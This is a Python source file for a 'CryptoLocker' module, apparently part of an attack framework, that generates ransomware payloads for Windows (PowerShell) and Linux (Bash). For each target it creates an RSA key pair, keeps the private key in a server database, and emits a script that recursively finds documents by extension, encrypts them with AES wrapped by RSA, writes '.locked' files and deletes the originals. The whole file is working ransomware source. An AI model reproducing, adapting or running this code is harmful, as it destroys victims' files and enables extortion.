from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization
from sqlmodel import Session

from backend.models.key_store import KeyStore
from .base_module import BaseModule


class CryptoLocker(BaseModule):
    """RSA-2048 + AES hybrid-encryption payload generator."""

    def generate_payload(
        self,
        target_os: str,
        session: Session,
        target_id: str,
        **params,
    ) -> str:
        target_directory: str = params.get("target_directory", "/tmp")
        file_extensions: list[str] = params.get("file_extensions", [".txt", ".pdf", ".docx"])

        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = private_key.public_key()

        pub_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        ).decode()

        priv_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        ).decode()

        ks = KeyStore(
            target_id=target_id,
            public_key_pem=pub_pem,
            private_key_pem=priv_pem,
        )
        session.add(ks)
        session.flush()

        os_lower = target_os.lower()
        if "windows" in os_lower or "win" in os_lower:
            script = self._build_ps_script(pub_pem, target_directory, file_extensions)
            return self._wrap_powershell(script)
        else:
            script = self._build_bash_script(pub_pem, target_directory, file_extensions)
            return self._wrap_bash(script)

    @staticmethod
    def _build_ps_script(pub_pem: str, target_dir: str, extensions: list[str]) -> str:
        ext_filter = " -or ".join(
            [f'$_.Extension -eq "{ext}"' for ext in extensions]
        )
        return f'''
$pubPem = @"
{pub_pem.strip()}
"@

$pubBytes = [System.Text.Encoding]::UTF8.GetBytes($pubPem)
$pemString = [System.Text.Encoding]::UTF8.GetString($pubBytes)
$pemLines = $pemString -split "`n" | Where-Object {{ $_ -notmatch "BEGIN|END" }} | ForEach-Object {{ $_.Trim() }}
$derBytes = [Convert]::FromBase64String(($pemLines -join ""))
$rsa = [System.Security.Cryptography.RSA]::Create()
$rsa.ImportSubjectPublicKeyInfo($derBytes, [ref]$null)

$targetDir = "{target_dir}"
$files = Get-ChildItem -Path $targetDir -Recurse -File | Where-Object {{ {ext_filter} }}
Write-Output "DEBUG: Files found: $($files.Count)"
$encryptedCount = 0
$failedCount = 0
$encryptedList = ""
$failedList = ""
$maxRetries = 3

Write-Output "DEBUG: Target directory: {target_dir}"

foreach ($f in $files) {{
    $success = $false
    $lastError = ""
    Write-Output "DEBUG: Processing file: $($f.FullName)"

    for ($retry = 1; $retry -le $maxRetries; $retry++) {{
        try {{
            # Wait before retry attempts
            if ($retry -gt 1) {{ Start-Sleep -Milliseconds (500 * $retry) }}

            $data = [System.IO.File]::ReadAllBytes($f.FullName)
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.KeySize = 256
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.GenerateKey()
            $aes.GenerateIV()
            $encryptor = $aes.CreateEncryptor()
            $encData = $encryptor.TransformFinalBlock($data, 0, $data.Length)
            $encKey = $rsa.Encrypt($aes.Key, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
            $blob = New-Object byte[] ($encKey.Length + $aes.IV.Length + $encData.Length)
            [Array]::Copy($encKey, 0, $blob, 0, $encKey.Length)
            [Array]::Copy($aes.IV, 0, $blob, $encKey.Length, $aes.IV.Length)
            [Array]::Copy($encData, 0, $blob, $encKey.Length + $aes.IV.Length, $encData.Length)
            [System.IO.File]::WriteAllBytes($f.FullName + ".locked", $blob)
            Remove-Item -Force $f.FullName
            $encryptedCount++
            $encryptedList += "$($f.FullName)`n"
            Write-Output "DEBUG: Successfully encrypted: $($f.FullName)"
            $success = $true
            break
        }} catch {{
            $lastError = $_.Exception.Message
            Write-Output "DEBUG: Encryption failed for $($f.FullName): $lastError"
            if ($retry -eq $maxRetries) {{
                $failedCount++
                $failedList += "$($f.FullName): $lastError`n"
            }}
        }}
    }}
}}

# Output results
Write-Output "=== CRYPTO LOCKER RESULTS ==="
Write-Output "Files encrypted: $encryptedCount"
Write-Output "Files failed: $failedCount"
if ($encryptedCount -gt 0) {{
    Write-Output ""
    Write-Output "--- ENCRYPTED FILES ---"
    Write-Output $encryptedList
}}
if ($failedCount -gt 0) {{
    Write-Output ""
    Write-Output "--- FAILED FILES ---"
    Write-Output $failedList
}}
Write-Output "=== END RESULTS ==="
'''

    @staticmethod
    def _build_bash_script(pub_pem: str, target_dir: str, extensions: list[str]) -> str:
        if extensions:
            find_expr = " -o ".join([f'-name "*{ext}"' for ext in extensions])
            find_cmd = f'find "{target_dir}" -type f \\( {find_expr} \\)'
        else:
            find_cmd = f'find "{target_dir}" -type f'

        return f'''#!/bin/bash
PUB_PEM=$(mktemp)
cat > "$PUB_PEM" << 'PUBKEY'
{pub_pem.strip()}
PUBKEY

ENCRYPTED_COUNT=0
FAILED_COUNT=0
MAX_RETRIES=3
ENCRYPTED_FILES=""
FAILED_FILES=""

echo "DEBUG: Target directory: {target_dir}"
echo "DEBUG: Find command: {find_cmd}"

# Count files first and store in array to avoid subshell issues
FILES_ARRAY=()
while IFS= read -r -d '' file; do
    FILES_ARRAY+=("$file")
done < <({find_cmd} -print0)

FILE_COUNT=${{#FILES_ARRAY[@]}}
echo "DEBUG: Files found: $FILE_COUNT"

# Process files from array to maintain variable scope
for file in "${{FILES_ARRAY[@]}}"; do
    echo "DEBUG: Processing file: $file"
    SUCCESS=false
    LAST_ERROR=""

    for RETRY in $(seq 1 $MAX_RETRIES); do
        # Wait before retry attempts
        [ "$RETRY" -gt 1 ] && sleep $((RETRY * 1))

        if AES_KEY=$(openssl rand -hex 64) &&
           AES_IV=$(openssl rand -hex 32) &&
           openssl enc -aes-256-cbc -in "$file" -out "${{file}}.locked" -K "$AES_KEY" -iv "$AES_IV" 2>/dev/null &&
           echo -n "$AES_KEY" | xxd -r -p | openssl rsautl -encrypt -pubin -inkey "$PUB_PEM" -oaep > "${{file}}.locked.meta" 2>/dev/null &&
           echo "$AES_IV" >> "${{file}}.locked.meta" &&
           rm -f "$file" 2>/dev/null; then
            ENCRYPTED_COUNT=$((ENCRYPTED_COUNT + 1))
            ENCRYPTED_FILES="$ENCRYPTED_FILES$file"$'\n'
            echo "DEBUG: Successfully encrypted: $file"
            SUCCESS=true
            break
        else
            LAST_ERROR="encryption failed (attempt $RETRY/$MAX_RETRIES)"
            echo "DEBUG: Encryption failed for $file: $LAST_ERROR"
            # Clean up partial files on failure
            rm -f "${{file}}.locked" "${{file}}.locked.meta" 2>/dev/null
        fi
    done

    if [ "$SUCCESS" = false ]; then
        FAILED_COUNT=$((FAILED_COUNT + 1))
        FAILED_FILES="$FAILED_FILES$file: $LAST_ERROR"$'\n'
    fi
done

# Output results
echo "=== CRYPTO LOCKER RESULTS ==="
echo "Files encrypted: $ENCRYPTED_COUNT"
echo "Files failed: $FAILED_COUNT"

if [ "$ENCRYPTED_COUNT" -gt 0 ]; then
    echo ""
    echo "--- ENCRYPTED FILES ---"
    echo "$ENCRYPTED_FILES"
fi

if [ "$FAILED_COUNT" -gt 0 ]; then
    echo ""
    echo "--- FAILED FILES ---"
    echo "$FAILED_FILES"
fi

echo "=== END RESULTS ==="

rm -f "$PUB_PEM"
'''
